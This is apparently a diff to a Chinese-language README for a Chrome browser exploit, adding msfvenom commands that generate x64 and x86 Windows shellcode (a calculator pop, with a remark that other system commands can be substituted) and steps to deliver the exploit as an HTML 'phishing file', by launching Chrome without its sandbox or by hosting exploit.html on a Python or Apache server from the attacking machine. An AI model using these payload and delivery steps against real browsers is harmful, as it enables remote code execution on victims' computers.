@@ -3,9 +3,19 @@
 
 #### 弹出计算器的shellcode生成命令：
 
-```msfvenom -a x86 -p windows/exec CMD="calc" EXITFUNC=thread -f num```
+**64位操作系统：**
 
-*（当然也可以换成其他系统命令）*
+```
+msfvenom -a x64 -p windows/x64/exec CMD="calc" EXITFUNC=thread -f num
+```
+
+**32位操作系统：**
+
+```
+msfvenom -a x86 -p windows/exec CMD="calc" EXITFUNC=thread -f num
+```
+
+*（当然也可以换成其他系统命令，注意这里的架构要和浏览器所在操作系统的保持一致，一般为64位）*
 
 ### 制作html钓鱼文件
 
@@ -19,22 +29,30 @@
 ```
 chrome.exe --no-sanbox /path/to/exploit.html
 ```
+![image](https://user-images.githubusercontent.com/41281045/115233357-617a7800-a14a-11eb-9221-1d6b9d96acfe.png)
+
+
 #### 方式二
 
 在攻击机当前目录下用python或kali自带的apache2开启一个http服务。
 
 python3.x版本：
 
-```python3 -m http.server 80```
+```
+python3 -m http.server 80
+```
 
 python2.x版本：
 
-```python -m SimpleHttpServer 80```
+```
+python -m SimpleHttpServer 80
+```
 
 apache2
 
+```
 sudo systemctl start apache2
-
+```
 
 http://127.0.0.1/path/to/exploit.html
 
